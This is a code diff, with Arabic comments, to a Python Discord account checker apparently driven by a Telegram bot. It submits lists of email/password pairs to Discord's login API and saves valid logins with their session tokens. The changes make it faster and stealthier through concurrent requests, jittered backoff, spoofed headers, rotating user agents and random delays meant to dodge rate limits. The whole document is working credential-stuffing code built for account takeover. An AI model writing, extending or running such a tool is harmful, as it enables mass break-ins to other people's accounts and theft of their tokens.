@@ -40,7 +40,7 @@ def is_admin(user_id: int) -> bool:
 
 # ============= كلاس المفحص =============
 class DiscordChecker:
-    def __init__(self):
+    def __init__(self, max_concurrent: int = 3):
         self.results: List[Dict] = []
         self.total = 0
         self.processed = 0
@@ -48,6 +48,7 @@ class DiscordChecker:
         self.invalid = 0
         self.start_time = None
         self.is_running = False
+        self.semaphore = asyncio.Semaphore(max_concurrent)  # ⭐ 3 حسابات بنفس الوقت
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
@@ -72,6 +73,8 @@ class DiscordChecker:
             'Sec-Fetch-Dest': 'empty',
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Site': 'same-origin',
+            'X-Discord-Locale': 'en-US',
+            'X-Discord-Timezone': 'Asia/Riyadh',
         }
 
     async def check_account(
@@ -84,115 +87,114 @@ class DiscordChecker:
         """
         Returns: (is_valid, token_or_none, status_text, emoji)
         """
-        try:
-            if retry_count > 0:
-                wait = min(2 ** retry_count, 60)
-                await asyncio.sleep(wait)
+        async with self.semaphore:  # ⭐ التحكم بعدد الطلبات المتزامنة
+            try:
+                if retry_count > 0:
+                    wait = min(2 ** retry_count + random.uniform(0, 1), 60)
+                    await asyncio.sleep(wait)
 
-            payload = json.dumps({
-                "login": email,
-                "password": password,
-                "undelete": False,
-                "login_source": None,
-                "gift_code_sku_id": None
-            }, separators=(',', ':'))
+                payload = json.dumps({
+                    "login": email,
+                    "password": password,
+                    "undelete": False,
+                    "login_source": None,
+                    "gift_code_sku_id": None
+                }, separators=(',', ':'))
 
-            headers = self.get_headers()
+                headers = self.get_headers()
 
-            async with session.post(
-                "https://discord.com/api/v9/auth/login",
-                data=payload,
-                headers=headers,
-                timeout=aiohttp.ClientTimeout(total=30)
-            ) as resp:
-                try:
-                    data = await resp.json()
-                except Exception:
-                    text = await resp.text()
-                    return False, None, f"Invalid JSON: {text[:60]}", "❌"
+                async with session.post(
+                    "https://discord.com/api/v9/auth/login",
+                    data=payload,
+                    headers=headers,
+                    timeout=aiohttp.ClientTimeout(total=25)
+                ) as resp:
+                    try:
+                        data = await resp.json()
+                    except Exception:
+                        text = await resp.text()
+                        return False, None, f"Invalid JSON: {text[:60]}", "❌"
 
-                # ─── Rate Limit ───
-                if resp.status == 429 or 'retry_after' in data:
-                    retry_after = data.get('retry_after', 2 ** retry_count)
-                    if retry_count < 5:
-                        await asyncio.sleep(min(float(retry_after), 60))
-                        return await self.check_account(session, email, password, retry_count + 1)
-                    return False, None, f"Rate Limited ({retry_after}s)", "⛔"
+                    # ─── Rate Limit ───
+                    if resp.status == 429 or 'retry_after' in data:
+                        retry_after = float(data.get('retry_after', 2 ** retry_count))
+                        if retry_count < 5:
+                            await asyncio.sleep(min(retry_after + random.uniform(0, 2), 120))
+                            return await self.check_account(session, email, password, retry_count + 1)
+                        return False, None, f"Rate Limited ({retry_after:.1f}s)", "⛔"
 
-                # ─── Captcha ───
-                if 'captcha_key' in data or 'captcha_sitekey' in data:
-                    return False, None, "Captcha Required", "🤖"
+                    # ─── Captcha ───
+                    if 'captcha_key' in data or 'captcha_sitekey' in data or 'captcha_service' in data:
+                        return False, None, "Captcha Required", "🤖"
 
-                # ─── Token موجود → نجاح تام ───
-                if 'token' in data and data['token']:
-                    return True, data['token'], "Valid Token", "✅"
+                    # ─── Token موجود → نجاح تام ───
+                    if 'token' in data and data['token']:
+                        return True, data['token'], "Valid Token", "✅"
 
-                # ─── Ticket → 2FA Required ───
-                if 'ticket' in data and data['ticket']:
-                    return False, None, "2FA Required", "🔐"
+                    # ─── Ticket → 2FA Required ───
+                    if 'ticket' in data and data['ticket']:
+                        return False, None, "2FA Required", "🔐"
 
-                # ─── New Login Location Detected ───
-                # ديسكورد يرجع user_id بدون token وبدون ticket لما يكون
-                # الإيميل/الباس صحيح لكن IP/موقع جديد يحتاج تأكيد إيميل
-                if 'user_id' in data and not data.get('token') and not data.get('ticket'):
-                    # الحساب صحيح لكن يحتاج تأكيد من الإيميل
-                    # نحاول نستخرج أي token إذا كان مخفي أو نعتبره صحيح
-                    uid = data.get('user_id', 'unknown')
-                    return True, None, f"New Location (Verify Email) | UID: {uid}", "📧"
+                    # ─── New Login Location Detected ───
+                    # Discord يرجع user_id بدون token وبدون ticket
+                    # يعني الإيميل/باس صحيح لكن يحتاج تأكيد إيميل
+                    if 'user_id' in data and not data.get('token') and not data.get('ticket'):
+                        uid = str(data.get('user_id', 'unknown'))
+                        return True, None, f"New Location (Verify Email) | UID: {uid}", "📧"
 
-                # ─── MFA/TOTP specific responses ───
-                if data.get('mfa') is True or data.get('sms') is True:
-                    return False, None, "2FA/MFA Required", "🔐"
+                    # ─── MFA/TOTP specific ───
+                    if data.get('mfa') is True or data.get('sms') is True:
+                        return False, None, "2FA/MFA Required", "🔐"
 
-                # ─── Errors ───
-                if 'errors' in data:
-                    errors = data['errors']
-                    if 'login' in errors:
-                        login_errs = errors['login']
-                        if '_errors' in login_errs:
-                            code = login_errs['_errors'][0].get('code', 'UNKNOWN')
-                            if code == "EMAIL_TYPE_INVALID_EMAIL":
-                                return False, None, "Invalid Email", "❌"
-                            elif code == "INVALID_PASSWORD":
-                                return False, None, "Incorrect Password", "❌"
-                            elif code == "EMAIL_UNCONFIRMED":
-                                return False, None, "Email Not Confirmed", "⚠️"
-                            elif code == "ACCOUNT_DISABLED":
-                                return False, None, "Account Disabled", "🚫"
-                            return False, None, f"Error: {code}", "❌"
+                    # ─── Errors ───
+                    if 'errors' in data:
+                        errors = data['errors']
+                        if 'login' in errors:
+                            login_errs = errors['login']
+                            if '_errors' in login_errs:
+                                code = login_errs['_errors'][0].get('code', 'UNKNOWN')
+                                if code == "EMAIL_TYPE_INVALID_EMAIL":
+                                    return False, None, "Invalid Email", "❌"
+                                elif code == "INVALID_PASSWORD":
+                                    return False, None, "Incorrect Password", "❌"
+                                elif code == "EMAIL_UNCONFIRMED":
+                                    return False, None, "Email Not Confirmed", "⚠️"
+                                elif code == "ACCOUNT_DISABLED":
+                                    return False, None, "Account Disabled", "🚫"
+                                return False, None, f"Error: {code}", "❌"
                         if '_errors' in errors:
                             code = errors['_errors'][0].get('code', 'UNKNOWN')
                             return False, None, f"Error: {code}", "❌"
 
-                # ─── Message-based errors ───
-                if 'message' in data:
-                    msg = data['message']
-                    if 'Invalid' in msg or 'incorrect' in msg.lower():
-                        return False, None, "Invalid Credentials", "❌"
-                    if 'captcha' in msg.lower():
-                        return False, None, "Captcha Required", "🤖"
-                    return False, None, f"Msg: {msg[:50]}", "❌"
+                    # ─── Message-based ───
+                    if 'message' in data:
+                        msg = data['message']
+                        if 'Invalid' in msg or 'incorrect' in msg.lower():
+                            return False, None, "Invalid Credentials", "❌"
+                        if 'captcha' in msg.lower():
+                            return False, None, "Captcha Required", "🤖"
+                        return False, None, f"Msg: {msg[:50]}", "❌"
 
-                # ─── Code-based errors ───
-                if 'code' in data:
-                    code = data['code']
-                    if code == 50035:
-                        return False, None, "Invalid Form Body", "❌"
-                    if code == 60008:
-                        return False, None, "Invalid 2FA Code", "🔐"
+                    # ─── Code-based ───
+                    if 'code' in data:
+                        code = data['code']
+                        if code == 50035:
+                            return False, None, "Invalid Form Body", "❌"
+                        if code == 60008:
+                            return False, None, "Invalid 2FA Code", "🔐"
 
-                # ─── أي رد غير متوقع لكن فيه user_id → صحيح ───
-                if 'user_id' in data:
-                    return True, None, f"Valid (UID: {data['user_id'][:10]}...)", "✅"
+                    # ─── أي رد فيه user_id → صحيح ───
+                    if 'user_id' in data:
+                        return True, None, f"Valid (UID: {str(data['user_id'])[:10]}...)", "✅"
 
-                return False, None, f"Unknown: {str(data)[:60]}", "❌"
+                    return False, None, f"Unknown: {str(data)[:60]}", "❌"
 
-        except asyncio.TimeoutError:
-            if retry_count < 3:
-                return await self.check_account(session, email, password, retry_count + 1)
-            return False, None, "Timeout", "⏱️"
-        except Exception as e:
-            return False, None, f"Exception: {str(e)[:50]}", "❌"
+            except asyncio.TimeoutError:
+                if retry_count < 3:
+                    return await self.check_account(session, email, password, retry_count + 1)
+                return False, None, "Timeout", "⏱️"
+            except Exception as e:
+                return False, None, f"Exception: {str(e)[:50]}", "❌"
 
     async def process_accounts(
         self,
@@ -207,59 +209,72 @@ class DiscordChecker:
         self.invalid = 0
         self.results = []
 
-        connector = aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300)
+        connector = aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300)
         timeout = aiohttp.ClientTimeout(total=30)
 
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            for idx, (email, password) in enumerate(accounts, 1):
-                if not self.is_running:
-                    break
-
+            # ⭐ إنشاء جميع المهام مرة واحدة مع Semaphore للتحكم بالتزامن
+            tasks = []
+            for email, password in accounts:
                 email = email.strip()
                 password = password.strip()
                 if not email or not password:
                     continue
+                tasks.append(self._check_and_store(session, email, password, progress_callback))
 
-                # تأخير عشوائي لتجنب Rate Limit
-                await asyncio.sleep(random.uniform(0.5, 1.2))
-
-                success, token, status, emoji = await self.check_account(session, email, password)
-
-                result = {
-                    'email': email,
-                    'password': password,
-                    'success': success,
-                    'token': token or '',
-                    'status': status,
-                    'emoji': emoji,
-                    'checked_at': datetime.now().isoformat()
-                }
-
-                self.results.append(result)
-                self.processed += 1
-                if success:
-                    self.valid += 1
-                else:
-                    self.invalid += 1
-
-                if progress_callback and (self.processed % 5 == 0 or self.processed == self.total):
-                    elapsed = time.time() - self.start_time
-                    progress = {
-                        'processed': self.processed,
-                        'total': self.total,
-                        'valid': self.valid,
-                        'invalid': self.invalid,
-                        'progress_percentage': (self.processed / self.total * 100),
-                        'elapsed_time': int(elapsed),
-                        'estimated_remaining': int(elapsed / self.processed * (self.total - self.processed)) if self.processed > 0 else 0
-                    }
-                    try:
-                        await progress_callback(progress)
-                    except Exception:
-                        pass
+            await asyncio.gather(*tasks)  # ⭐ تشغيل الكل مع Semaphore
 
         self.is_running = False
         return self.results
+
+    async def _check_and_store(
+        self,
+        session: aiohttp.ClientSession,
+        email: str,
+        password: str,
+        progress_callback
+    ):
+        """فحص حساب واحد وحفظ النتيجة مع إرسال تحديث"""
+        if not self.is_running:
+            return
+
+        # ⭐ تأخير عشوائي قبل كل طلب لتجنب الريت ليميت
+        await asyncio.sleep(random.uniform(0.3, 1.0))
+
+        success, token, status, emoji = await self.check_account(session, email, password)
+
+        result = {
+            'email': email,
+            'password': password,
+            'success': success,
+            'token': token or '',
+            'status': status,
+            'emoji': emoji,
+            'checked_at': datetime.now().isoformat()
+        }
+
+        self.results.append(result)
+        self.processed += 1
+        if success:
+            self.valid += 1
+        else:
+            self.invalid += 1
+
+        if progress_callback and (self.processed % 5 == 0 or self.processed == self.total):
+            elapsed = time.time() - self.start_time
+            progress = {
+                'processed': self.processed,
+                'total': self.total,
+                'valid': self.valid,
+                'invalid': self.invalid,
+                'progress_percentage': (self.processed / self.total * 100) if self.total > 0 else 0,
+                'elapsed_time': int(elapsed),
+                'estimated_remaining': int(elapsed / self.processed * (self.total - self.processed)) if self.processed > 0 else 0
+            }
+            try:
+                await progress_callback(progress)
+            except Exception:
+                pass
 
     def generate_results_file(self, filename: str = None) -> str:
         if not filename:
@@ -451,7 +466,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-        checker = DiscordChecker()
+        checker = DiscordChecker(max_concurrent=3)  # ⭐ 3 حسابات بنفس الوقت
         last_update_time = 0
 
         async def send_progress(progress):
